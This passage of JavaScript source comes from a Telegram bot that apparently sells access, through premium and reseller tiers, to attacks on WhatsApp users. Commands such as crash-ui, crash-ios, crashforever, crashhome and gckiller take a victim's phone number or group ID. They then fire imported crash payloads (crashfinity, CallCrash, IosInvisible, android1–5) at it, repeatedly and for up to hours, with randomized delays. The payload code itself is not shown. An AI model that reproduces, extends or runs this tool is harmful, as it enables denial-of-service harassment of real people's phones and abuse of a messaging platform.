      const targetJid = `${cleanTarget}@s.whatsapp.net`;
      
      let count = 1;
      if (args[2] && !isNaN(args[2])) {
          count = Math.min(parseInt(args[2]), 3);
      }

      const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
      const client = randomSession.sock;
      const senderNum = randomSession.num;

      try {
          const [exists] = await client.onWhatsApp(targetJid);
          if (!exists) {
              return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
          }

          log('command', msg.from.first_name, `Calling MERLIN DESTROYED on ${cleanTarget} via ${senderNum}`);
          
          const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
          
          await S7.sendPhoto(chatId, LoveImage, { 
              caption: SYLoves,
              parse_mode: 'HTML'
          });

          for (let i = 0; i < count; i++) {
              await azzixdestroyedLogic.crashfinity(client, targetJid);
              
              if (i < count - 1) {
                  const delayTime = getRandomDelay(10000, 20000);
                  log('info', 'SYSTEM', `Waiting ${delayTime/1000} seconds before next attack...`);
                  await new Promise(resolve => setTimeout(resolve, delayTime));
              }
          }
          
          await S7.sendMessage(chatId, `✅ <b>💀 MERLIN DESTROYED completed on ${cleanTarget}</b>\n\n` +
              `📱 Session: <code>${senderNum}</code>\n` +
              `🎯 Attacks: ${count} time(s)`, 
              { parse_mode: 'HTML' });

      } catch (err) {
          log('error', 'azzixdestroyed', err.message);
          S7.sendMessage(chatId, `❌ Error: ${err.message}`);
      }
  });


  SYLoVe('delresell', (msg) => {
      const chatId = msg.chat.id.toString();
      const userId = msg.from.id.toString();
      
      if (!LoveGlobalState(userId)) {
          return sendSYLove(S7, chatId);
      }
      
      if (Number(chatId) !== Number(config.adminId)) {
          return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
      }

      const targetId = msg.text.split(' ')[1];
      if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');

      let db = getDB();
      if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');

      db.resellers = db.resellers.filter(id => id !== targetId);
      saveDB(db);
      S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
 });


  SYLoVe('listresell', async (msg) => {
      const chatId = msg.chat.id.toString();
      const userId = msg.from.id.toString();
      
      if (!LoveGlobalState(userId)) {
          return sendSYLove(S7, chatId);
      }
      
      if (Number(chatId) !== Number(config.adminId)) {
          return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
      }

      let db = getDB();
      if (db.resellers.length === 0) {
          return S7.sendMessage(chatId, 'No resellers found.');
      }

      let text = 'Reseller List:\n\n';

      for (let i = 0; i < db.resellers.length; i++) {
          const id = db.resellers[i].toString();
          try {
              const user = await S7.getChat(id);
              const username = user.username ? `@${user.username} : ` : '';
              text += `${i + 1}. ${username}<code>${id}</code>\n`;
          } catch (e) {
              text += `${i + 1}. \`${id}\`\n`;
          }
      }
      text += '\n──────────────────';

      S7.sendMessage(chatId, text, {
          parse_mode: 'HTML'
      });
  });


  SYLoVe('addprem', (msg) => {
      const chatId = msg.chat.id.toString();
      const userId = msg.from.id.toString();
      let db = getDB();
      
      const isOwner = chatId.toString() === config.adminId.toString();
      const isReseller = db.resellers.includes(chatId.toString());
      
      if (!LoveGlobalState(userId)) {
          return sendSYLove(S7, chatId);
      }

      if (!isOwner && !isReseller) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

      const targetId = msg.text.split(' ')[1];
      if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');

      if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');

      db.premium.push(targetId);
      saveDB(db);
      S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
});


  SYLoVe('delprem', (msg) => {
      const chatId = msg.chat.id.toString();
      const userId = msg.from.id.toString();
      let db = getDB();
      
      const isOwner = chatId.toString() === config.adminId.toString();
      const isReseller = db.resellers.includes(chatId.toString());
      
      if (!LoveGlobalState(userId)) {
          return sendSYLove(S7, chatId);
      }

      if (!isOwner && !isReseller) return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');

      const targetId = msg.text.split(' ')[1];
      if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');

      if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');

      db.premium = db.premium.filter(id => id !== targetId);
      saveDB(db);
      S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
});


  SYLoVe('crash-ui', async (msg) => {
      const chatId = msg.chat.id.toString();
      const userId = msg.from.id.toString();
      const args = msg.text.split(' ');
      const targetNum = args[1];
      
      const s7CM = `crashfinity`

      if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
      if (!waSessions[chatId] || waSessions[chatId].length === 0) {
          return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
      }

      if (!targetNum) {
          return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: /${s7CM} +999999999999`);
      }

      const cleanTarget = targetNum.replace(/[^0-9]/g, '');
      const targetJid = `${cleanTarget}@s.whatsapp.net`;
      const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
      const client = randomSession.sock;
      const senderNum = randomSession.num;

      try {
          const [exists] = await client.onWhatsApp(targetJid);
          if (!exists) {
              return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
          }

          log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
          
          if (typeof CrashLogic.crashfinity === 'function') {
              await CrashLogic.crashfinity(client, targetJid);
          } else {
              throw new Error(`Function not found in ${s7CM}.js`);
          }

          const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
          await S7.sendPhoto(chatId, LoveImage, { 
              caption: SYLoves,
              parse_mode: 'HTML'
          });

      } catch (err) {
          log('error', `${s7CM}`, err.message);
          S7.sendMessage(chatId, `❌ Error: ${err.message}`);
      }
  });
SYLoVe(['ios-gc', 'andro-gc', 'gckiller', 'groupui'], async (msg) => {
    try {
        const chatId = msg.chat.id.toString();
        const userId = msg.from.id.toString();
        const args = msg.text.split(' ');
        
        const s7CM = args[0].replace('/', '/').replace('.', ''); 
        const targetNum = args[1];
        const durationArg = args[2];

        if (!LoveGlobalState(userId)) {
            return sendSYLove(S7, chatId);
        }

        if (!waSessions[chatId] || waSessions[chatId].length === 0) {
            return S7.sendMessage(
                chatId,
                `❌ No Number connected please use /reqpair to connect.`
            );
        }

        if (!targetNum || !durationArg) {
            return S7.sendMessage(
                chatId,
                `❌ Provide a GC jid and Duration.\nExample: /${s7CM} 1236xxx@g.us 2`
            );
        }

        if (!targetNum.endsWith('@g.us')) {
            return S7.sendMessage(chatId, '❌ Invalid group JID');
        }

        if (isNaN(durationArg)) {
            return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
        }

        const targetJid = targetNum.trim();
        const hours = parseInt(durationArg);
        const durationMs = hours * 60 * 60 * 1000;
        const startTime = Date.now();

        const randomSession =
            waSessions[chatId][
                Math.floor(Math.random() * waSessions[chatId].length)
            ];

        const client = randomSession.sock;
        const senderNum = randomSession.num;

        log(
            'command',
            msg.from.first_name,
            `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`
        );

        const SYLoves = BvgSYLoVe(targetJid, senderNum, args[2] || 'N/A');

        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        let attackCount = 0;
        while ((Date.now() - startTime) < durationMs) {
            if (typeof XgcLogic.Xgc === 'function') {
                await XgcLogic.Xgc(client, targetJid);
                attackCount++;
                
                if (attackCount % 3 === 0) {
                    const delayTime = getRandomDelay(8000, 15000);
                    log('info', 'SYSTEM', `Taking break for ${delayTime/1000} seconds...`);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

    } catch (err) {
        log('error', 'xgroup', err.message);
        await S7.sendMessage(
            msg.chat.id,
            `❌ Error: ${err.message}`
        );
    }
});


SYLoVe(['shahzucrash', 'unblockcrash', 'pendingv2', 'pendingmix'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await CallLogic.CallCrash(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await CallLogic.CallCrash(client, targetJid);
                attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});


SYLoVe('crash-ios', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await testlogic.test(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await testlogic.test(client, targetJid);
                attackCount++;
                
                if (attackCount % 4 === 0) {
                    const breakTime = getRandomDelay(8000, 12000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(2000);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});


SYLoVe(['cantsee', 'iosnova', 'IosInvisiblex', 'hidenseek'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await IosLogic.IosInvisible(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await IosLogic.IosInvisible(client, targetJid);
                attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});
SYLoVe(['crashinfinityios', 'crashinfinityios1', 'crashinfinityios2', 'crashinfinityios3'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await bahiravaiosLogic.bahiravaios(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await bahiravaiosLogic.bahiravaios(client, targetJid);
                attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});


SYLoVe('crashforever', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await XLogic.Xdelay(client, targetJid);
                await android1Logic.android1(client, targetJid);
                await android2Logic.android2(client, targetJid);
                await android3Logic.android3(client, targetJid);
                await android4Logic.android4(client, targetJid);
                await android5Logic.android5(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await XLogic.Xdelay(client, targetJid);
                await android1Logic.android1(client, targetJid);
                await android2Logic.android2(client, targetJid);
                await android3Logic.android3(client, targetJid);
                await android4Logic.android4(client, targetJid);
                await android5Logic.android5(client, targetJid);
                attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});


SYLoVe('crashhome', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await bahirava1Logic.bahirava1(client, targetJid);
                await android1Logic.android1(client, targetJid);
                await android2Logic.android2(client, targetJid);
                await android3Logic.android3(client, targetJid);
                await android4Logic.android4(client, targetJid);
                await android5Logic.android5(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await bahirava1Logic.bahirava1(client, targetJid);
                await android1Logic.android1(client, targetJid);
                await android2Logic.android2(client, targetJid);
                await android3Logic.android3(client, targetJid);
                await android4Logic.android4(client, targetJid);
                await android5Logic.android5(client, targetJid);
                attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});


SYLoVe('crashmaker', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget, senderNum, args[2] || 'N/A');
        await S7.sendPhoto(chatId, LoveImage, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await bahirava2Logic.bahirava2(client, targetJid);
                await android1Logic.android1(client, targetJid);
                await android2Logic.android2(client, targetJid);
                await android3Logic.android3(client, targetJid);
                await android4Logic.android4(client, targetJid);
                await android5Logic.android5(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await bahirava2Logic.bahirava2(client, targetJid);
                await android1Logic.android1(client, targetJid);
                await android2Logic.android2(client, targetJid);
                await android3Logic.android3(client, targetJid);
                await android4Logic.android4(client, targetJid);
                await android5Logic.android5(client, targetJid);
                attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});
SYLoVe('listprem', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }
    
    if (Number(chatId) !== Number(config.adminId)) {
        return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
    }

    let db = getDB();
    if (db.premium.length === 0) {
        return S7.sendMessage(chatId, 'No premium users found.');
    }

    let text = 'Premium List:\n\n';

    for (let i = 0; i < db.premium.length; i++) {
        const id = db.premium[i].toString();
        try {
            const user = await S7.getChat(id);
            const username = user.username ? `@${user.username} : ` : '';
            text += `${i + 1}. ${username}<code>${id}</code>\n`;
        } catch (e) {
            text += `${i + 1}. \`${id}\`\n`;
        }
    }
    text += '\n──────────────────';

    S7.sendMessage(chatId, text, {
        parse_mode: 'HTML'
    });
});


SYLoVe(['groupid', 'listgc'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(
            chatId,
            '❌ No WhatsApp number connected. Please use /reqpair first.'
        );
    }

    const groups = await getUserWhatsAppGroups(chatId);
    if (groups.length === 0) {
        return S7.sendMessage(chatId, '❌ No WhatsApp groups found on your connected numbers.');
    }

    let text = `⬣ <b>YOUR WHATSAPP GROUP IDS</b>\n\n`;
    text += `📦 <b>Total Groups:</b> ${groups.length}\n\n`;

    groups.forEach((group, index) => {
        text += `❏ <b>Group ${index + 1}</b>\n`;
        text += `│⭔ <b>Name:</b> ${escapeTelegramHtml(group.subject)}\n`;
        text += `│⭔ <b>ID:</b> <code>${escapeTelegramHtml(group.id)}</code>\n`;
        text += `│⭔ <b>Number:</b> <code>${escapeTelegramHtml(group.num)}</code>\n`;
        text += `╰──────────────\n\n`;
    });

    if (text.length > 4000) {
        const filePath = path.join(LoveDir, `groupid-${chatId}.txt`);
        fs.writeFileSync(filePath, text.replace(/<[^>]*>/g, ''));
        return S7.sendDocument(chatId, filePath, {
            caption: `✅ ${groups.length} WhatsApp group IDs`
        });
    }

    return S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
});


SYLoVe('setbot', async (msg) => {
    const chatId = String(msg.chat.id);

    try {
        let db = getDB();

        const botData = db.tokens.find(
            bot => String(bot.owner) === chatId
        );

        if (!botData) {
            return S7.sendMessage(
                chatId,
                `╭━━━〔 ❌ Eʀʀᴏʀ 〕━━━╮\n┃ Nᴏ ʜᴏsᴛᴇᴅ ʙᴏᴛ ғᴏᴜɴᴅ.\n╰━━━━━━━━━━━━━━━━━━╯\n\nUꜱᴇ:\n<code>/addbot YOUR_TOKEN</code>`,
                { parse_mode: 'HTML' }
            );
        }

        const messageText = (msg.text || msg.caption || '').trim();
        const args = messageText.split(/\s+/);
        const type = args[1]?.toLowerCase();
        let value = args.slice(2).join(' ').trim();

        if (type === 'video' && msg.video) {
            value = msg.video.file_id;
        }

        if (type === 'video' && msg.reply_to_message?.video) {
            value = msg.reply_to_message.video.file_id;
        }

        if (!type) {
            return S7.sendMessage(chatId, setBotHelp(), { parse_mode: 'HTML' });
        }

        if (!botData.config) botData.config = {};

        if (type === 'name') {
            if (!value) return S7.sendMessage(chatId, `❌ <b>Nᴀᴍᴇ Nᴏᴛ Pʀᴏᴠɪᴅᴇᴅ</b>\n\nExᴀᴍᴘʟᴇ:\n<code>/setbot name My Bot</code>`, { parse_mode: 'HTML' });
            if (value.length > 64) return S7.sendMessage(chatId, '❌ Name too long (max 64 chars).');
            botData.config.botName = value;
        } else if (type === 'video') {
            if (!value) return S7.sendMessage(chatId, `❌ Send video with /setbot video\nOr reply to a video with /setbot video`, { parse_mode: 'HTML' });
            botData.config.video = value;
        } else if (type === 'channel') {
            if (!value) return S7.sendMessage(chatId, `❌ Channel link missing.\n\nEx: <code>/setbot channel https://t.me/yourchannel</code>`, { parse_mode: 'HTML' });
            botData.config.channel = value;
        } else if (type === 'group') {
            if (!value) return S7.sendMessage(chatId, `❌ Group link missing.\n\nEx: <code>/setbot group https://t.me/yourgroup</code>`, { parse_mode: 'HTML' });
            botData.config.group = value;
        } else if (type === 'contact') {
